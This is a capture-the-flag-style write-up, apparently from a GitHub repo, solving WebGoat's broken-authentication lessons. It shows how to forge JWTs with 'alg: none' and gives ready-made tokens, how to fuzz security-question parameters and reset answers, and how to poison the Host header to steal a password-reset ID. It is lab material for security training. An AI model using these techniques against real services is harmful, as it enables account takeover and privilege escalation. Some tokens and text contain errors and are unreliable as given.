# Broken Authenticaton
## Authentication Bypasses
### Number 2
![Authentication Bypasses n.2](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_01.png)

In this exercise we need to replecate the attack that is described in this [article](https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass).

![ZAP proxy submit](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_02.png)

As you can see there are two cookies (secQuestion0 and secQuestion1), we need to fuzz the names of coockies. Use ZAP and fuzz the 2 secQuestion, with the Regex payload. The solution will be to use secQuestion3 and secQuestion5 as name of parameter. We use secQuestion[0–9] as Regex.

![Fuzzing with ZAP](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_03.png)

![Solution request and response](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_04.png)
## JWT Tokens
### Number 4
![JWT tokens n.4](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_05.png)

In this exercise we need to reset all the votes, only admin can do that. We need to log as a normal user, like Tom, then reset request using ZAP.

![Solution n.4](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_06.png)

We need to decode the base64 access token ([base64 decoder](https://www.base64decode.org)). Then we delete the signature portion, change in the Header the "alg" value from "HS256" to "none", and set the admin field to "true". The result should be like:

```
{
  "alg": "none"
}

{
  "iat": 1567805972,
  "admin": "true",
  "user": "Tom"
}

ewogICJhbGciOiAibm9uZSIKfQ==.ewogICJpYXQiOiAxNTY3ODA1OTcyLAogICJhZG1pbiI6ICJ0cnVlIiwKICAidXNlciI6ICJUb20iCn0=.
```

### Number 5

For this example we need to know the structure of a JWT token.

![JWT Tokens n.5](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_07.png)

We need to [base64 decode](https://www.base64decode.org) the header and the payload part. Then we change the "alg" and "username" values to "none" and "WebGoat". Now we [base64 encode](https://www.base64encode.org) the 2 parts. At the end we will have "\<header\>.\<payload\>.", no signature.

![Base64 decoder](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_08.png)

Header

```
{"alg":"none"}
eyJhbGciOiJub25lIn0=
```

You need to change iat and exp value with yours(You can read exercise 7 to learn how to do)

Payload

```
{"iss":"WebGoat Token Builder","aud":"webgoat.org","iat":1571830867,"exp":1571830927,"sub":"tom@webgoat.org","username":"WebGoat","Email":"tom@webgoat.org","Role":["Manager","Project Administrator"]}
eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTU3MTgzMDg2NywiZXhwIjoxNTcxODMwOTI3LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0Lm9yZyIsIlJvbGUiOlsiTWFuYWdlciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ==
```

### Number 7
![JWT Token n. 7](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_09.png)

To resolve this test we need to read this [write-up](https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/).

We [base64 decode](https://www.base64decode.org) and read the access token given in the log file.

```
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ
{"alg":"HS512"}.{"iat":1526131411,"exp":1526217811,"admin":"false","user":"Tom"}.
```

We change "alg" value to "none", and "iat" and "exp" parameter to new dates. "iat" is the the date when the token is created and "exp" when it shuld expire. We can calculate the date using this [site](https://www.epochconverter.com).

```
{"alg":"none"}.{"iat":1567883929,"exp":1570475929,"admin":"false","user":"Tom"}.
eyJhbGciOiJub25lIn0=.eyJpYXQiOjE1Njc4ODM5MjksImV4cCI6MTU3MDQ3NTkyOSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ==.
```

We change the request for the checkout like this: (you need to use your "iat" and "exp" data and use "Authorization: Bearer "\<head\>.\<payload\>.)

![Final request](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_10.png)

### Number 8
![JWT tokens n.8](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_11.png)

To resolve this exercise we try to delete Jerry's account and change the token, we set the "alg" value to "none" and "username" to "Tom". Then we remove the signature part.
The results will be like:
```
{"typ":"JWT","kid":"webgoat_key","alg":"none"}.{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom","Email":"jerry@webgoat.com","Role":["Cat"]}.
```
Then [encode in base64](https://www.base64encode.org) the token, use it with ZAP.
```
eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6Im5vbmUifT57ImlzcyI6IldlYkdvYXQgVG9rZW4gQnVpbGRlciIsImlhdCI6MTUyNDIxMDkwNCwiZXhwIjoxNjE4OTA1MzA0LCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsInN1YiI6ImplcnJ5QHdlYmdvYXQuY29tIiwidXNlcm5hbWUiOiJUb20iLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0=.
```

## Password reset
### Number 2
![Password Reset n. 2](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_12.png)

This is just a simple exercise to learn how to use WebWolf. You just need to send a reset password request using \*@webgoat.org (Instead of "\*", use your username) as email. Log in WebWolf and read the email. Use the password given to log in.
### Number 4
![Password Reset n. 4](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_13.png)

We try to login with a example user like "pippo", we get "User pippo is not a valid user.", but if we try with "Jerry" we get "Sorry the solution is not correct, please try again.", now we know the user to use.
Now with ZAP we can fuzz for all possible color. To do that we need to copy a wordlist of color like [this](https://raw.githubusercontent.com/imsky/wordlists/master/adjectives/colors.txt), and pass to the ZAP fuzzer, like in Authentication Bypasses exercise 2.

![Fuzzer ZAP color word list](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_14.png)
### Number 5
This is not an exercise. Just read 2 or more question.

### Number 6
During this exercise i used BurpSuite instead of ZAP.

![Password Reset n. 5](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_15.png)

First try with a test account like "pippo@webgoat.org", then go to WebWolf and see the emails.

![Password Reset Email WebWolf](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_16.png)

Try the link, as we can see in the url there is an ID for the request. So we need to find the exact id for "tom@webgoat-cloud.org". To do this we set Burp Suite as proxy and intercept  the request for the reset and change the host location to match the WebWolf ip and port. Like in this image.

![Burp Suite](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_17.png)

You can use repeater to do that as i did. Then go to the WebWolf Incoming Request and read the ID, in the request.

![WebWolf Incoming request](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/02_18.png)

Now go to \<ip-address\>:\<port\>/WebGoat/PasswordReset/reset/reset-password/\<ID\>. And reset the password for Tom. Now you can login as Tom.
## Secure Passwords
### Number 4
This is just a password tester, we just need to find a password that get a good score. Just think a good password.
